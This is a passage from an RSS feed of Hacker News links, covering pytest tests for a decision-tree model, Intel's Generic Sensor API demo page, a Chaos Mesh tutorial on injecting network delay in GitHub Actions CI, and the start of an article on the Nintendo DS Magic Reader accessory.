    <span>assert</span> <span>concat_df</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span> <span>==</span> <span>train</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span> <span>+</span> <span>test</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span>
</code></pre></div></div>

<p>Given perfectly separable data and unlimited depth, our decision tree should be able to “memorise” the training data and <em><a href="https://en.wikipedia.org/wiki/Overfitting" target="_blank">overfit</a> completely</em>. In other words, if we train <em>and</em> evaluate on the training data, we should get 100% accuracy. (Note: the Titanic data isn’t perfectly separable so we’ll create a small data sample for this.)</p>

<div><div><pre><code><span>@</span><span>pytest</span><span>.</span><span>fixture</span>
<span>def</span> <span>dummy_feats_and_labels</span><span>():</span>
    <span>feats</span> <span>=</span> <span>np</span><span>.</span><span>array</span><span>([[</span><span>0.7057</span><span>,</span> <span>-</span><span>5.4981</span><span>,</span> <span>8.3368</span><span>,</span> <span>-</span><span>2.8715</span><span>],</span>
                      <span>[</span><span>2.4391</span><span>,</span> <span>6.4417</span><span>,</span> <span>-</span><span>0.80743</span><span>,</span> <span>-</span><span>0.69139</span><span>],</span>
                      <span>[</span><span>-</span><span>0.2062</span><span>,</span> <span>9.2207</span><span>,</span> <span>-</span><span>3.7044</span><span>,</span> <span>-</span><span>6.8103</span><span>],</span>
                      <span>[</span><span>4.2586</span><span>,</span> <span>11.2962</span><span>,</span> <span>-</span><span>4.0943</span><span>,</span> <span>-</span><span>4.3457</span><span>],</span>
                      <span>[</span><span>-</span><span>2.343</span><span>,</span> <span>12.9516</span><span>,</span> <span>3.3285</span><span>,</span> <span>-</span><span>5.9426</span><span>],</span>
                      <span>[</span><span>-</span><span>2.0545</span><span>,</span> <span>-</span><span>10.8679</span><span>,</span> <span>9.4926</span><span>,</span> <span>-</span><span>1.4116</span><span>],</span>
                      <span>[</span><span>2.2279</span><span>,</span> <span>4.0951</span><span>,</span> <span>-</span><span>4.8037</span><span>,</span> <span>-</span><span>2.1112</span><span>],</span>
                      <span>[</span><span>-</span><span>6.1632</span><span>,</span> <span>8.7096</span><span>,</span> <span>-</span><span>0.21621</span><span>,</span> <span>-</span><span>3.6345</span><span>],</span>
                      <span>[</span><span>0.52374</span><span>,</span> <span>3.644</span><span>,</span> <span>-</span><span>4.0746</span><span>,</span> <span>-</span><span>1.9909</span><span>],</span>
                      <span>[</span><span>1.5077</span><span>,</span> <span>1.9596</span><span>,</span> <span>-</span><span>3.0584</span><span>,</span> <span>-</span><span>0.12243</span><span>]</span>
                      <span>])</span>
    <span>labels</span> <span>=</span> <span>np</span><span>.</span><span>array</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>])</span>
    <span>return</span> <span>feats</span><span>,</span> <span>labels</span>

<span>def</span> <span>test_dt_overfit</span><span>(</span><span>dummy_feats_and_labels</span><span>):</span>
    <span>feats</span><span>,</span> <span>labels</span> <span>=</span> <span>dummy_feats_and_labels</span>
    <span>dt</span> <span>=</span> <span>DecisionTree</span><span>()</span>
    <span>dt</span><span>.</span><span>fit</span><span>(</span><span>feats</span><span>,</span> <span>labels</span><span>)</span>
    <span>pred</span> <span>=</span> <span>np</span><span>.</span><span>round</span><span>(</span><span>dt</span><span>.</span><span>predict</span><span>(</span><span>feats</span><span>))</span>

    <span>assert</span> <span>np</span><span>.</span><span>array_equal</span><span>(</span><span>labels</span><span>,</span> <span>pred</span><span>),</span> <span>'DecisionTree should fit data perfectly and prediction should == labels.'</span>
</code></pre></div></div>

<p>Lastly, we check if increasing tree depth leads to increased accuracy and AUC ROC on <em>training</em> data (though it’ll overfit and perform poorly on <em>validation</em> data). In the test below, we fit trees of depth one to 10 and ensure training accuracy and AUC increases consistently.</p>

<div><div><pre><code><span>def</span> <span>test_dt_increase_acc</span><span>(</span><span>dummy_titanic</span><span>):</span>
    <span>X_train</span><span>,</span> <span>y_train</span><span>,</span> <span>_</span><span>,</span> <span>_</span> <span>=</span> <span>dummy_titanic</span>

    <span>acc_list</span> <span>=</span> <span>[]</span>
    <span>auc_list</span> <span>=</span> <span>[]</span>
    <span>for</span> <span>depth</span> <span>in</span> <span>range</span><span>(</span><span>1</span><span>,</span> <span>10</span><span>):</span>
        <span>dt</span> <span>=</span> <span>DecisionTree</span><span>(</span><span>depth_limit</span><span>=</span><span>depth</span><span>)</span>
        <span>dt</span><span>.</span><span>fit</span><span>(</span><span>X_train</span><span>,</span> <span>y_train</span><span>)</span>
        <span>pred</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_train</span><span>)</span>
        <span>pred_binary</span> <span>=</span> <span>np</span><span>.</span><span>round</span><span>(</span><span>pred</span><span>)</span>
        <span>acc_list</span><span>.</span><span>append</span><span>(</span><span>accuracy_score</span><span>(</span><span>y_train</span><span>,</span> <span>pred_binary</span><span>))</span>
        <span>auc_list</span><span>.</span><span>append</span><span>(</span><span>roc_auc_score</span><span>(</span><span>y_train</span><span>,</span> <span>pred</span><span>))</span>

    <span>assert</span> <span>sorted</span><span>(</span><span>acc_list</span><span>)</span> <span>==</span> <span>acc_list</span><span>,</span> <span>'Accuracy should increase as tree depth increases.'</span>
    <span>assert</span> <span>sorted</span><span>(</span><span>auc_list</span><span>)</span> <span>==</span> <span>auc_list</span><span>,</span> <span>'AUC ROC should increase as tree depth increases.'</span>
</code></pre></div></div>

<h2 id="post-train-tests-to-ensure-expected-learned-behaviour">Post-train tests to ensure expected learned behaviour</h2>

<p>In post-train tests, we want to <strong>check if the model is behaving …</strong></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://eugeneyan.com/writing/testing-ml/">https://eugeneyan.com/writing/testing-ml/</a></em></p>]]>
            </description>
            <link>https://eugeneyan.com/writing/testing-ml/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24523930</guid>
            <pubDate>Sat, 19 Sep 2020 01:23:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Generic Sensor API Playground]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24523862">thread link</a>) | @victorbreder
<br/>
September 18, 2020 | https://intel.github.io/generic-sensor-demos/ | <a href="https://web.archive.org/web/*/https://intel.github.io/generic-sensor-demos/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      

<p>This repository contains applications that demonstrate how to use the
<a href="https://www.w3.org/TR/generic-sensor/">Generic Sensor API</a>.</p>

<p>The <a href="https://www.w3.org/TR/generic-sensor/">Generic Sensor API</a> is a set of
interfaces which expose sensor devices to the web platform. The API consists
of the base <a href="https://w3c.github.io/sensors/#the-sensor-interface">Sensor</a>
interface and a set of concrete sensor classes built on top, such as
<a href="https://w3c.github.io/accelerometer/#accelerometer-interface">Accelerometer</a>,
<a href="https://w3c.github.io/accelerometer/#linearaccelerationsensor-interface">LinearAccelerationSensor</a>,
<a href="https://w3c.github.io/gyroscope/#gyroscope-interface">Gyroscope</a>,
<a href="https://w3c.github.io/orientation-sensor/#absoluteorientationsensor-interface">AbsoluteOrientationSensor</a>
and <a href="https://w3c.github.io/orientation-sensor/#relativeorientationsensor-interface">RelativeOrientationSensor</a>.</p>

<p>The Generic Sensor API is very simple and easy-to-use! The Sensor interface has
<a href="https://w3c.github.io/sensors/#sensor-start"><code>start()</code></a> and
<a href="https://w3c.github.io/sensors/#sensor-stop"><code>stop()</code></a> methods to control sensor state
and several event handlers for receiving notifications about sensor activation, errors and newly
available readings. The concrete sensor classes usually add their specific reading attributes to
the base class.</p>

<h2 id="launch-instructions">Launch instructions</h2>

<p>The demo apps work with Chrome 63 or later. If you have an older version of Chrome, please enable
the <a href="chrome://flags/#enable-generic-sensor">chrome://flags/#enable-generic-sensor</a> flag, before
running the demos.</p>

<p>If the demo is using environmental sensors, such as,
<a href="https://w3c.github.io/magnetometer/#magnetometer-interface">Magnetometer</a> or
<a href="https://w3c.github.io/ambient-light/#ambient-light-sensor-interface">AmbientLightSensor</a>,
please also enable
<a href="chrome://flags/#enable-generic-sensor-extra-classes">chrome://flags/#enable-generic-sensor-extra-classes</a>
flag.</p>

<p>You could run demos from <a href="https://intel.github.io/generic-sensor-demos/">GitHub Pages for this repository.</a></p>

<h2 id="demos-description">Demos description</h2>

<h3 id="punchmeter-code"><a href="https://intel.github.io/generic-sensor-demos/punchmeter/">Punchmeter</a> (<a href="https://github.com/intel/generic-sensor-demos/tree/master/punchmeter">code</a>)</h3>

<p>Punchmeter is a simple application that calculates user’s punch speed using
LinearAcceleration sensor. To try it the user should make a punch holding
mobile device in his/her hand.</p>

<p><img src="https://intel.github.io/generic-sensor-demos/images/punchmeter.gif" alt="Punchmeter demo"></p>

<hr>

<h3 id="orientation-phone-code"><a href="https://intel.github.io/generic-sensor-demos/orientation-phone/">Orientation phone</a> (<a href="https://github.com/intel/generic-sensor-demos/tree/master/orientation-phone">code</a>)</h3>

<p>This simple demo illustrates how an absolute orientation sensor can be used to
modify rotation quaternion of a 3D model. The <code>model</code> is a three.js
<a href="https://threejs.org/docs/index.html#api/core/Object3D"><code>Object3D</code></a> class instance
that has <a href="https://threejs.org/docs/index.html#api/core/Object3D.quaternion"><code>quaternion</code></a>
property.</p>

<p><img src="https://intel.github.io/generic-sensor-demos/images/orientation-phone.png" alt="Orientation sensor demo"></p>

<hr>

<h3 id="360-degree-beach-panorama-demo-code"><a href="https://intel.github.io/generic-sensor-demos/websensor-panorama/">360 degree beach panorama demo</a> (<a href="https://github.com/intel/generic-sensor-demos/tree/master/websensor-panorama">code</a>)</h3>

<p>The demo presents a 360 degree panorama view of a beach with an added sound effect.
The user can look around the scene by moving their device.
The demo uses the orientation sensor to enable the user to look around.</p>

<p><img src="https://intel.github.io/generic-sensor-demos/websensor-panorama/websensor-panorama.gif?raw=true" alt="360 Panorama"></p>

<hr>

<h3 id="360-degree-video-demo-code"><a href="https://intel.github.io/generic-sensor-demos/websensor-video/">360 degree video demo</a> (<a href="https://github.com/intel/generic-sensor-demos/tree/master/websensor-video">code</a>)</h3>

<p>This demo presents a 360 degree video that the user can look around by moving their device.
The user can also play the video in both forward and reverse by holding the device and walking
forward and backward, respectively.
The demo uses the orientation sensor to enable the user to look around and the accelerometer for
walking detection to enable the user to control video playback by walking.</p>

<hr>

<h3 id="ambient-map-demo-code"><a href="https://intel.github.io/generic-sensor-demos/ambient-map/build/bundled/">Ambient Map demo</a> (<a href="https://github.com/intel/generic-sensor-demos/tree/master/ambient-map/build/bundled">code</a>)</h3>

<p>This web application demonstrates how Ambient light sensor can be used to control style of a map widget.
When ambient illuminance level is less than 10 lumen, night mode style will be used.</p>

<p><strong>Note:</strong> this demo requires
<a href="chrome://flags/#enable-generic-sensor-extra-classes">chrome://flags/#enable-generic-sensor-extra-classes</a>
flag set.</p>

<p><img width="40%" src="https://intel.github.io/generic-sensor-demos/ambient-map/ambient-map.gif?raw=true" alt="Ambient Map demo"></p>

<hr>

<h3 id="sensor-info-demo-code"><a href="https://intel.github.io/generic-sensor-demos/sensor-info/build/bundled/">Sensor Info demo</a> (<a href="https://github.com/intel/generic-sensor-demos/tree/master/sensor-info/build/bundled">code</a>)</h3>

<p>This web application presents information about device sensors and their reading values.</p>

<p><strong>Note:</strong> this demo requires
<a href="chrome://flags/#enable-generic-sensor-extra-classes">chrome://flags/#enable-generic-sensor-extra-classes</a>
flag set.</p>

<p><img width="40%" src="https://intel.github.io/generic-sensor-demos/sensor-info/sensor-info.gif?raw=true" alt="Sensor Info demo"></p>

<hr>

<h3 id="vr-button-demo-code"><a href="https://intel.github.io/generic-sensor-demos/vr-button/build/bundled/">VR Button demo</a> (<a href="https://github.com/intel/generic-sensor-demos/tree/master/vr-button/build/bundled">code</a>)</h3>

<p>This web application demonstrates how Magnetometer sensor can be used to provide user input for WebVR
content. If you have VR enclosure with magnet button, you can interact with objects in the scene by
sliding button down.</p>

<p><strong>Note:</strong> this demo requires
<a href="chrome://flags/#enable-generic-sensor-extra-classes">chrome://flags/#enable-generic-sensor-extra-classes</a>
flag set.</p>

<p><img width="40%" src="https://intel.github.io/generic-sensor-demos/vr-button/vr-button.gif?raw=true" alt="VR Button demo"></p>

<hr>

<h3 id="sensor-tester-code"><a href="https://intel.github.io/generic-sensor-demos/sensor-tester/build/bundled/">Sensor tester</a> (<a href="https://github.com/intel/generic-sensor-demos/tree/master/sensor-tester">code</a>)</h3>

<p>This web application allows to test functionality of the sensors, correctness of their models in correspondence with respective specification.</p>

<p><strong>Note:</strong> this demo requires
<a href="chrome://flags/#enable-generic-sensor-extra-classes">chrome://flags/#enable-generic-sensor-extra-classes</a>
flag set.</p>

<p><img src="https://intel.github.io/generic-sensor-demos/images/sensor-tester.png?raw=true" alt="Sensor tester"></p>

<h2 id="development-environment">Development environment</h2>

<p>If you would like to modify the existing code and experiment with the sensors API
your code must be hosted on a web server that supports HTTPS.
The simplest way is to fork this repository and enable
<a href="https://help.github.com/articles/configuring-a-publishing-source-for-github-pages/">GitHub Pages</a>
for your fork. Alternatevely, you can serve your web application locally, for this, we recommend to use
<a href="https://chrome.google.com/webstore/detail/web-server-for-chrome/ofhbbkphhbklhfoeikjpcbhemlocgigb">Web Server for Chrome</a>.
If you are developing for mobile devices,set up
<a href="https://developers.google.com/web/tools/chrome-devtools/remote-debugging/local-server">port forwarding</a>
for your local server, and you are good to go!</p>

<h2 id="reporting-a-security-issue">Reporting a security issue</h2>
<p>If you have information about a security issue or vulnerability with an Intel-maintained open source project on https://github.com/intel, please send an e-mail to secure-opensource@intel.com. Encrypt sensitive information using our PGP public key. For issues related to Intel products, please visit https://security-center.intel.com.</p>


      
    </section></div>]]>
            </description>
            <link>https://intel.github.io/generic-sensor-demos/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24523862</guid>
            <pubDate>Sat, 19 Sep 2020 01:15:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Integrate Chaos Engineering into Your CI]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24523156">thread link</a>) | @ngaut
<br/>
September 18, 2020 | https://chaos-mesh.org/blog/chaos-mesh-action-integrate-chaos-engineering-into%20-your-ci/ | <a href="https://web.archive.org/web/*/https://chaos-mesh.org/blog/chaos-mesh-action-integrate-chaos-engineering-into%20-your-ci/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><img alt="chaos-mesh-action - Integrate-Chaos-Engineering-into-Your-CI" src="https://chaos-mesh.org/assets/images/chaos-mesh-action-7f3cb1496d259110ce51cfcaa49ae146.png"></p><p><a href="https://chaos-mesh.org/" target="_blank" rel="noopener noreferrer">Chaos Mesh</a> is a cloud-native chaos testing platform that orchestrates chaos in Kubernetes environments. While it’s well received in the community with its rich fault injection types and easy-to-use dashboard, it was difficult  to use Chaos Mesh with end-to-end testing or the continuous integration (CI) process. As a result, problems introduced during system development could not be discovered before the release.</p><p>In this article, I will share how we use chaos-mesh-action, a GitHub action to integrate Chaos Mesh into the CI process.</p><p>chaos-mesh-action is available on <a href="https://github.com/marketplace/actions/chaos-mesh" target="_blank" rel="noopener noreferrer">GitHub market</a>, and the source code is on <a href="https://github.com/chaos-mesh/chaos-mesh-action" target="_blank" rel="noopener noreferrer">GitHub</a>.</p><h2>Design of chaos-mesh-action</h2><p><a href="https://docs.github.com/en/actions" target="_blank" rel="noopener noreferrer">GitHub Action</a> is a CI/CD feature natively supported by GitHub, through which we can easily build automated and customized software development workflows in the GitHub repository. </p><p>Combined with GitHub actions, Chaos Mesh can be more easily integrated into the daily development and testing of the system, thus guaranteeing that each code submission on GitHub is bug-free and won’t damage existing code. The following figure shows chaos-mesh-action integrated into the CI workflow:</p><p><img alt="chaos-mesh-action integrate in the CI workflow" src="https://chaos-mesh.org/assets/images/chaos-mesh-action-integrate-in-the-ci-workflow-6b70ea3c8457f74cfd89305a20d9bec4.png"></p><h2>Using chaos-mesh-action in GitHub workflow</h2><p><a href="https://github.com/marketplace/actions/chaos-mesh" target="_blank" rel="noopener noreferrer">chaos-mesh-action</a> works in Github workflows. A GitHub workflow is a configurable automated process that you can set up in your repository to build, test, package, release, or deploy any GitHub project. To integrate Chaos Mesh in your CI, do the following:</p><ol><li>Design a workflow.</li><li>Create a workflow.</li><li>Run the workflow.</li></ol><h3>Design a workflow</h3><p>Before you design a workflow, you must consider the following issues:</p><ul><li>What functions are we going to test in this workflow?</li><li>What types of faults will we inject? </li><li>How do we verify the correctness of the system?</li></ul><p>As an example, let’s design a simple test workflow that includes the following steps: </p><ol><li>Create two Pods in a Kubernetes cluster.</li><li>Ping one pod from the other. </li><li>Use Chaos Mesh to inject network delay chaos and test whether the ping command is affected.</li></ol><h3>Create the workflow</h3><p>After you design the workflow, the next step is to create it. </p><ol><li>Navigate to the GitHub repository that contains the software you want to test.</li><li>To start creating a workflow, click <strong>Actions</strong>, and then click the <strong>"New workflow</strong>" button:</li></ol><p><img alt="Creating a workflow" src="https://chaos-mesh.org/assets/images/creating-a-workflow-17c7622de0400b1cf0d0bd091a1c0561.png"></p><p>A workflow is essentially the configuration of jobs that take place sequentially and automatically. Note that the jobs are configured in a single file. For better illustration, we split the script into different job groups as shown below: </p><ul><li><p>Set the workflow name and trigger rules.</p><p>This job names the workflow "Chaos.” When the code is pushed to the master branch or a pull request is submitted to the master branch, this workflow is triggered.</p><div><div><div tabindex="0"><div><p><span>name</span><span>:</span><span> Chaos</span></p><p><span></span><span>on</span><span>:</span><span></span></p><p><span> </span><span>push</span><span>:</span><span></span></p><p><span>   </span><span>branches</span><span>:</span><span></span></p><p><span>     </span><span>-</span><span> master</span></p><p><span> </span><span>pull_request</span><span>:</span><span></span></p><p><span>   </span><span>branches</span><span>:</span><span></span></p><p><span>     </span><span>-</span><span> master</span></p></div></div></div></div></li><li><p>Install the CI-related environment.</p><p>This configuration specifies the operating system (Ubuntu), and that it uses <a href="https://github.com/marketplace/actions/kind-cluster" target="_blank" rel="noopener noreferrer">helm/kind-action</a> to create a Kind cluster. Then, it outputs related information about the cluster. Finally, it checks out the GitHub repository for the workflow to access. </p><div><div><div tabindex="0"><div><p><span>jobs</span><span>:</span><span></span></p><p><span> </span><span>build</span><span>:</span><span></span></p><p><span>   </span><span>runs-on</span><span>:</span><span> ubuntu</span><span>-</span><span>latest</span></p><p><span>   </span><span>steps</span><span>:</span><span></span></p><p><span>   </span><span>-</span><span> </span><span>name</span><span>:</span><span> Creating kind cluster</span></p><p><span>     </span><span>uses</span><span>:</span><span> helm/kind</span><span>-</span><span>action@v1.0.0</span><span>-</span><span>rc.1</span></p><p><span>   </span><span>-</span><span> </span><span>name</span><span>:</span><span> Print cluster information</span></p><p><span>     </span><span>run</span><span>:</span><span> </span><span>|</span><span></span></p><p><span>       kubectl config view</span></p><p><span>       kubectl cluster-info</span></p><p><span>       kubectl get nodes</span></p><p><span>       kubectl get pods -n kube-system</span></p><p><span>       helm version</span></p><p><span>       kubectl version</span><span></span></p><p><span>   </span><span>-</span><span> </span><span>uses</span><span>:</span><span> actions/checkout@v2</span></p></div></div></div></div></li><li><p>Deploy the application.</p><p>In our example, this job deploys an application that creates two Kubernetes Pods.</p><div><div><div tabindex="0"><div><p><span>-</span><span> </span><span>name</span><span>:</span><span> Deploy an application</span></p><p><span>     </span><span>run</span><span>:</span><span> </span><span>|</span><span></span></p><p><span>       kubectl apply -f https://raw.githubusercontent.com/chaos-mesh/apps/master/ping/busybox-statefulset.yaml</span></p></div></div></div></div></li><li><p>Inject chaos with chaos-mesh-action.</p><div><div><div tabindex="0"><div><p><span>-</span><span> </span><span>name</span><span>:</span><span> Run chaos mesh action</span></p><p><span>    </span><span>uses</span><span>:</span><span> chaos</span><span>-</span><span>mesh/chaos</span><span>-</span><span>mesh</span><span>-</span><span>action@xiang/refine_script</span></p><p><span>    </span><span>env</span><span>:</span><span></span></p><p><span>      </span><span>CFG_BASE64</span><span>:</span><span> YXBpVmVyc2lvbjogY2hhb3MtbWVzaC5vcmcvdjFhbHBoYTEKa2luZDogTmV0d29ya0NoYW9zCm1ldGFkYXRhOgogIG5hbWU6IG5ldHdvcmstZGVsYXkKICBuYW1lc3BhY2U6IGJ1c3lib3gKc3BlYzoKICBhY3Rpb246IGRlbGF5ICMgdGhlIHNwZWNpZmljIGNoYW9zIGFjdGlvbiB0byBpbmplY3QKICBtb2RlOiBhbGwKICBzZWxlY3RvcjoKICAgIHBvZHM6CiAgICAgIGJ1c3lib3g6CiAgICAgICAgLSBidXN5Ym94LTAKICBkZWxheToKICAgIGxhdGVuY3k6ICIxMG1zIgogIGR1cmF0aW9uOiAiNXMiCiAgc2NoZWR1bGVyOgogICAgY3JvbjogIkBldmVyeSAxMHMiCiAgZGlyZWN0aW9uOiB0bwogIHRhcmdldDoKICAgIHNlbGVjdG9yOgogICAgICBwb2RzOgogICAgICAgIGJ1c3lib3g6CiAgICAgICAgICAtIGJ1c3lib3gtMQogICAgbW9kZTogYWxsCg==</span></p></div></div></div></div><p>With chaos-mesh-action, the installation of Chaos Mesh and the injection of chaos complete automatically. You simply need to prepare the chaos configuration that you intend to use to get its Base64 representation. Here, we want to inject network delay chaos into the Pods, so we use the original chaos configuration as follows:</p><div><div><div tabindex="0"><div><p><span>apiVersion</span><span>:</span><span> chaos</span><span>-</span><span>mesh.org/v1alpha1</span></p><p><span></span><span>kind</span><span>:</span><span> NetworkChaos</span></p><p><span></span><span>metadata</span><span>:</span><span></span></p><p><span> </span><span>name</span><span>:</span><span> network</span><span>-</span><span>delay</span></p><p><span> </span><span>namespace</span><span>:</span><span> busybox</span></p><p><span></span><span>spec</span><span>:</span><span></span></p><p><span> </span><span>action</span><span>:</span><span> delay </span><span></span></p><p><span> </span><span>mode</span><span>:</span><span> all</span></p><p><span> </span><span>selector</span><span>:</span><span></span></p><p><span>   </span><span>pods</span><span>:</span><span></span></p><p><span>     </span><span>busybox</span><span>:</span><span></span></p><p><span>       </span><span>-</span><span> busybox</span><span>-</span><span>0</span><span></span></p><p><span> </span><span>delay</span><span>:</span><span></span></p><p><span>   </span><span>latency</span><span>:</span><span> </span><span>"10ms"</span><span></span></p><p><span> </span><span>duration</span><span>:</span><span> </span><span>"5s"</span><span></span></p><p><span> </span><span>scheduler</span><span>:</span><span></span></p><p><span>   </span><span>cron</span><span>:</span><span> </span><span>"@every 10s"</span><span></span></p><p><span> </span><span>direction</span><span>:</span><span> to</span></p><p><span> </span><span>target</span><span>:</span><span></span></p><p><span>   </span><span>selector</span><span>:</span><span></span></p><p><span>     </span><span>pods</span><span>:</span><span></span></p><p><span>       </span><span>busybox</span><span>:</span><span></span></p><p><span>         </span><span>-</span><span> busybox</span><span>-</span><span>1</span><span></span></p><p><span>   </span><span>mode</span><span>:</span><span> all</span></p></div></div></div></div><p>You can obtain the Base64 value of the above chaos configuration file using the following command:</p></li><li><p>Verify the system correctness.</p><p>In this job,  the workflow pings one Pod from the other and observes the changes in network delay.</p><div><div><div tabindex="0"><div><p><span>-</span><span> </span><span>name</span><span>:</span><span> Verify</span></p><p><span>     </span><span>run</span><span>:</span><span> </span><span>|</span><span></span></p><p><span>       echo "do some verification"</span></p><p><span>       kubectl exec busybox-0 -it -n busybox -- ping -c 30 busybox-1.busybox.busybox.svc</span></p></div></div></div></div></li></ul><h3>Run the workflow</h3><p>Now that the workflow is configured, we can trigger it by submitting a pull request to the master branch. When the workflow completes, the verification job outputs of the results that look similar to the following:</p><div><div><div tabindex="0"><div><p><span>do</span><span> some verification</span></p><p><span>Unable to use a TTY - input is not a terminal or the right kind of </span><span>file</span><span></span></p><p><span>PING busybox-1.busybox.busybox.svc </span><span>(</span><span>10.244</span><span>.0.6</span><span>)</span><span>: </span><span>56</span><span> data bytes</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>0</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>0.069</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>1</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>10.136</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>2</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>10.192</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>3</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>10.129</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>4</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>10.120</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>5</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>0.070</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>6</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>0.073</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>7</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>0.111</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>8</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>0.070</span><span> ms</span></p><p><span></span><span>64</span><span> bytes from </span><span>10.244</span><span>.0.6: </span><span>seq</span><span>=</span><span>9</span><span> </span><span>ttl</span><span>=</span><span>63</span><span> </span><span>time</span><span>=</span><span>0.077</span><span> ms</span></p><p><span>……</span></p></div></div></div></div><p>The output indicates a regular series of 10-millisecond delays that last about 5 seconds each. This is consistent with the chaos configuration we injected into chaos-mesh-action.  </p><h2>Current status and next steps</h2><p>At present, we have applied chaos-mesh-action to the <a href="https://github.com/pingcap/tidb-operator" target="_blank" rel="noopener noreferrer">TiDB Operator</a> project. The workflow is injected with the Pod chaos to verify the restart function of the specified instances of the operator. The purpose is to ensure that tidb-operator can work normally when the pods of the operator are randomly deleted by the injected faults. You can view the <a href="https://github.com/pingcap/tidb-operator/actions?query=workflow%3Achaos" target="_blank" rel="noopener noreferrer">TiDB Operator page</a> for more details.</p><p>In the future, we plan to apply chaos-mesh-action to more tests to ensure the stability of TiDB and related components. You are welcome to create your own workflow using chaos-mesh-action.</p><p>If you find a bug or think something is missing, feel free to file an issue, open a pull request (PR), or join us on the <a href="https://join.slack.com/t/cloud-native/shared_invite/zt-fyy3b8up-qHeDNVqbz1j8HDY6g1cY4w" target="_blank" rel="noopener noreferrer">#project-chaos-mesh</a> channel in the <a href="https://www.cncf.io/" target="_blank" rel="noopener noreferrer">CNCF</a> slack workspace. </p></section></div>]]>
            </description>
            <link>https://chaos-mesh.org/blog/chaos-mesh-action-integrate-chaos-engineering-into%20-your-ci/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24523156</guid>
            <pubDate>Sat, 19 Sep 2020 00:04:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Edge of Emulation: Magic Reader]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24522898">thread link</a>) | @Parseus
<br/>
September 18, 2020 | https://shonumi.github.io/articles/art23.html | <a href="https://web.archive.org/web/*/https://shonumi.github.io/articles/art23.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
			<!-- Main Page Inner Box -->
			<div>

				<p>Edge of Emulation: Magic Reader</p>
				<p>. . . . . . . . . . .</p>

				<p><img src="https://shonumi.github.io/articles/mr_1.png" alt=""></p>

				<p><strong>Beast Mode</strong></p>

				<p>Earlier this year, I went into a bit of a frenzy buying all kinds of NDS hardware to research. With GBE+ finally running more and more games, I anticipated working on many of the Slot-2 accessories for the system. I purchased more items than I had time to examine, so I ended up with quite a backlog. However, due to the COVID-19 pandemic, getting things from Japan to the United States is now rather expensive. In hindsight, it was very fortunate that I went shopping back then. The virus has seriously disrupted international shipping and has directly affected my efforts to document various games and products. Of particular note, I'm still waiting on a very interesting piece to come out of Europe. In the meantime, this is the perfect opportunity to really dive into some stuff that's been sitting on my shelves for a while now.</p>

				<p>In 2007, Konami launched a special add-on for the Nintendo DS called the "Magic Reader". It came bundled with the game Juushinden: Ultimate Beast Battlers. The title features card-based duels using monsters, very similar to the Pokemon TCG or Yu-Gi-Oh games. Unique to Juushinden, however, is the ability to scan real, physical cards into the game via the Magic Reader. By simply tapping the card against the device, the software registers it, thereby allowing players to use the digital version. Unlike other card-reading hardware such as the e-Reader, or HCV-1000, the Magic Reader does not use any sort of swiping mechanism. In fact, Juushinden's cards don't appear to have any visible barcodes or dotcodes. Perhaps it really is magic?</p>

